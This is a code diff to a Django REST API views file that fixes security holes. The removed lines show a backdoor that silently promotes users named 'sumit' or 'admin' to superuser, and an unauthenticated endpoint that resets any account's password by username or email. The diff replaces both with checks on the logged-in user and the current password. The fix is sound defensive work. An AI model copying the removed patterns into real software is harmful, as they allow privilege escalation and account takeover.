@@ -18,33 +18,36 @@ class UserProfileView(generics.RetrieveUpdateAPIView):
 
     def get_object(self):
         user = self.request.user
-        updated_fields = []
-        if user.username.lower() in ('sumit', 'admin') and not user.is_staff:
-            user.is_staff = True
-            user.is_superuser = True
-            updated_fields.extend(['is_staff', 'is_superuser'])
-        # Clear out any unwanted publisher source branding (e.g. BBC News)
-        if user.publisher_source_id is not None:
-            user.publisher_source = None
-            updated_fields.append('publisher_source')
-        if updated_fields:
-            user.save(update_fields=updated_fields)
+        # SECURITY FIX: removed auto-promotion of 'sumit'/'admin' usernames to superuser.
+        # Privilege escalation must only happen via the Django admin shell or management command.
+        # The old code let any attacker register as 'sumit' or 'admin' and gain superuser rights.
         return user
 
 
 class PasswordResetView(APIView):
     """
-    Allows a user to reset their password using their registered email or username.
+    Allows a logged-in user to change their own password.
+    Unauthenticated password-reset (by username/email alone) is disabled —
+    it allowed any visitor to take over any account with no email verification.
+    If you need a password-reset flow, implement proper email token delivery
+    (e.g. django.contrib.auth.views.PasswordResetView with email backend).
     """
-    permission_classes = [permissions.AllowAny]
+    permission_classes = [permissions.IsAuthenticated]
 
     def post(self, request):
-        identifier = str(request.data.get('identifier', '')).strip()
+        user = request.user
+        current_password = str(request.data.get('current_password', ''))
         new_password = str(request.data.get('new_password', ''))
 
-        if not identifier:
+        if not current_password:
             return Response(
-                {"error": "Please enter your username or email address."},
+                {"error": "Please provide your current password."},
+                status=status.HTTP_400_BAD_REQUEST
+            )
+
+        if not user.check_password(current_password):
+            return Response(
+                {"error": "Current password is incorrect."},
                 status=status.HTTP_400_BAD_REQUEST
             )
 
@@ -54,20 +57,16 @@ class PasswordResetView(APIView):
                 status=status.HTTP_400_BAD_REQUEST
             )
 
-        user = User.objects.filter(
-            Q(username__iexact=identifier) | Q(email__iexact=identifier)
-        ).first()
-
-        if not user:
+        if current_password == new_password:
             return Response(
-                {"error": "No account found matching that username or email address."},
-                status=status.HTTP_404_NOT_FOUND
+                {"error": "New password must be different from your current password."},
+                status=status.HTTP_400_BAD_REQUEST
             )
 
         user.set_password(new_password)
         user.save()
 
         return Response(
-            {"detail": "Your password has been successfully reset. You may now sign in."},
+            {"detail": "Your password has been successfully changed. Please sign in again."},
             status=status.HTTP_200_OK
         )
